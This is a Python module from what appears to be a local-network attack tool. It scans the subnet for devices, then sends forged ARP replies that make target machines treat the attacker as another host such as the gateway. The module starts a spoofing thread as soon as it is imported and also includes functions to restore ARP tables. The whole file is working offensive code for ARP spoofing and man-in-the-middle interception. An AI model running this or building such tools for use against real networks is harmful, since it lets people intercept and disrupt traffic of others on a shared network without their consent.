import socket
import ipaddress
import psutil
import logger
from colorama import init, Fore, Style
import commands
import arpspoof
from threading import Thread
import os

if os.name=="nt": # Scapy is kamene in windows
    import kamene.all as kamene
else:
    import scapy.all as kamene

Thread(target=arpspoof.arpspoof_thread).start()

gateway_ip = arpspoof.get_gateway_ip()


# Class to identify devices
class Device:
    def __init__(self, ip, mac, hostname):
        self.ip = ip
        self.mac = mac
        self.hostname = hostname

    def getIp(self):
        return self.ip

    def getMac(self):
        return self.mac

    def getHostname(self):
        return self.hostname


def getSubnetAndNetmask():
    """
    Desc: Returns the current subnet and netmask in CIDR notation
    Args: none
    """
    # Create a socket and get the local IP address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()

    # Iterate through network interfaces to find the one matching the IP address
    netmask = None
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and addr.address == ip_address:
                netmask = addr.netmask
                break
        if netmask:
            break

    if netmask is None:
        raise Exception("Unable to determine netmask for the current network interface.")

    # Convert the netmask to CIDR prefix length
    netmask_cidr = ipaddress.IPv4Network(f"0.0.0.0/{netmask}").prefixlen

    # Calculate the subnet using the IP address and CIDR prefix
    subnet = ipaddress.IPv4Network(f"{ip_address}/{netmask_cidr}", strict=False)

    return str(subnet)

def discover():
    """
    Desc: Returns a list of the available devices in the network
    Args: none
    Returns: a list of "device" class elements
    """

    timeoutSeconds = logger.customPrompt("Timeout (in seconds) (recommended:3-5)")
    
    logger.printInfo("Looking for devices on the local network")

    subn = getSubnetAndNetmask() # Get the subnet with the netmask in cidr prefix

    logger.printInfo("Scanning "+subn)

    arp = kamene.ARP(pdst=getSubnetAndNetmask())
    ether = kamene.Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp
    result = kamene.srp(packet, timeout=int(timeoutSeconds), verbose=0)[0]
    devices = []

    index = 0

    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "unknown hostname"

        devices.append( Device(ip,mac,hostname) )

        logger.printSuccess(f"Found [{Fore.YELLOW}{index}{Style.RESET_ALL}] {Fore.GREEN}{ip}{Style.RESET_ALL} with MAC:{Fore.GREEN}{mac}{Style.RESET_ALL} || HOSTNAME:{Fore.GREEN}{hostname}{Style.RESET_ALL}")
        index += 1

    return devices

#def get_mac(ip):
#    """
#    Desc: Retrieves the MAC address of the device associated with a given IP address.
#    Args: 
#        ip (str): The IP address of the target device.
#    Returns: 
#        str: The MAC address of the device.
#    """
#    arp_request = kamene.ARP(pdst = ip)  # Create an ARP request to the given IP
#    broadcast = kamene.Ether(dst ="ff:ff:ff:ff:ff:ff")  # Broadcast address
#    arp_request_broadcast = broadcast / arp_request  # Combine Ethernet frame and ARP request
#    answered_list = kamene.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]  # Send request and capture responses
#    return answered_list[0][1].hwsrc  # Return the MAC address of the responding device

#def spoof(target_ip, spoof_ip):
#    """
#    Desc: Spoofs an ARP reply to make the target device believe the attacker is the specified source IP.
#    Args:
#        target_ip (str): The IP address of the target device.
#        spoof_ip (str): The IP address to be spoofed (the source IP).
#    """
#    packet = kamene.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)  # Create ARP reply
#    kamene.send(packet, verbose = False)  # Send the ARP spoofing packet

def spoof(target_ip, target_mac, spoof_ip):
    """
    Desc: Spoofs an ARP reply to make the target device believe the attacker is the specified source IP.
    Args:
        target_ip (str): The IP address of the target device.
        spoof_ip (str): The IP address to be spoofed (the source IP).
    """
    
    packet = kamene.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)  # Create ARP reply
    kamene.send(packet, verbose = False)  # Send the ARP spoofing packet

def restore(destination_ip, source_ip):
    """
    Desc: Restores the original ARP tables for both the destination and source IP addresses.
    Args:
        destination_ip (str): The destination IP address (usually the gateway).
        source_ip (str): The source IP address (usually the target device).
    """
    destination_mac = arpspoof.get_mac(destination_ip)  # Get MAC address of destination
    source_mac = arpspoof.get_mac(source_ip)  # Get MAC address of source
    packet = kamene.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)  # Create ARP reply to restore original state
    kamene.send(packet, verbose = False)  # Send the restoration packet

def restorearp(gateway_ip, target_ip):
    """
    Desc: Restores the ARP tables of both the gateway and target device to stop ARP spoofing.
    Args:
        gateway_ip (str): The IP address of the gateway.
        target_ip (str): The IP address of the target device.
    """
    restore(gateway_ip, target_ip)  # Restore the ARP entry for the gateway
    restore(target_ip, gateway_ip)  # Restore the ARP entry for the target device

def restore_arp_table():
    global gateway_ip

    for device in commands.target_devices:
        try:
            ip = device.getIp()  # Get the IP address of the device
            hostname = device.getHostname()  # Get the hostname of the device
            mac = device.getMac()  # Get the MAC address of the device

            restorearp(gateway_ip, ip)
        
            logger.printInfo(f"Restored the arp table for {Fore.YELLOW}{ip}{Style.RESET_ALL} || {Fore.YELLOW}{mac}{Style.RESET_ALL} || ({Fore.YELLOW}{hostname}{Style.RESET_ALL})")
        
        except AttributeError:
            logger.printError(commands.nonDeviceType)
            pass
